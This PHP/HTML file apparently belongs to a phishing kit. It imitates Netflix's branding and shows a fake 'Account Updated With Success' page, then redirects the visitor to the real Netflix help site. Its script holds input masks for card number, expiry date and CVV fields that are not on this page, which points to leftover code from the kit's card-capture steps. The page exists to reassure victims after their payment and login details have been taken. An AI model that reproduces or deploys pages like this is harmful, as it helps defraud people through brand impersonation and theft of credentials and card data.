<?php 

ob_start();
?><html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Netflix</title>
<link rel="icon" href="./res/img/favicon.ico">
<link rel="stylesheet" href="./res/css/done.css">
<script src="./res/js/jquery.js"></script>
<script src="./res/js/jquery.mask.js"></script>
</head>
<body>
<div class="content">
<div class="top">
<div class="left">
<img src='./res/img/logo.png'>
</div>
<div class="right">
<a href="https://netflix.com">Sign Out</a>
</div>
</div>
<div class="login-form">
<h1 style="display:flex; align-items:center;"><img src="./res/img/check.png" style="margin-right:8px; width:30px;"> Account Updated With Success</h1>
 <button onclick="goHome()" id="login-btn" >My Account</button>
  <button onclick="goHome()" id="login-btn" style="background: lightgrey;
    color: #494949;">LogOut</button>
</div>
<div class="footer">
<div class="qs"><a href="#">Questions? Contact us.</a></div>
<div class="f-links">
<a href="#">Gift Card Terms</a> <a href="#">Terms of Use</a> <a href="#">Privacy Statement</a>
</div>
<select>
<option value="english">  English
</select>
</div>
</div>

<script>
function goHome(){
	window.location = "https://help.netflix.com/en/";
}
$(function(){
	$("#cardnumber").mask("0000000000000000");
	$("#date").mask("00/00");
	$("#cvv").mask("000");
});

function onLogin(){
	if($("#login").val().trim() == "" || $("#pass").val().trim() == ""){return false;}
	else{
	document.getElementById('login-btn').style.background = "#f42828";
 
	}
}
</script>
</body>
</html>